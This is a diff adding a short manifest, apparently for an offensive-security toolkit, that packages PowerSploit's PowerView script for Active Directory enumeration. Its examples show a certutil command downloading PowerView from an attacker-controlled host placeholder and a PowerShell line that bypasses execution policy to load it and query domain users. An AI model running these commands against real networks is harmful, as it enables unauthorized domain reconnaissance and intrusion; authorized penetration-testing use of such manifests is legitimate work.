@@ -1,0 +1,16 @@
+schema = 1
+kind = "upload"
+description = "PowerShell Active Directory enumeration from PowerSploit"
+tags = ["ad", "powershell", "enum", "windows"]
+upstream = "https://github.com/PowerShellMafia/PowerSploit"
+licence = "BSD-3-Clause"
+arch = "x86_64"
+examples = [
+  "certutil -urlcache -f http://{lhost}/PowerView.ps1 PowerView.ps1",
+  "powershell -ep bypass -c \". .\\PowerView.ps1; Get-DomainUser -Identity user\"",
+]
+
+[[upload]]
+path = "files/PowerView.ps1"
+as = "PowerView.ps1"
+note = "Import with: . .\\PowerView.ps1"
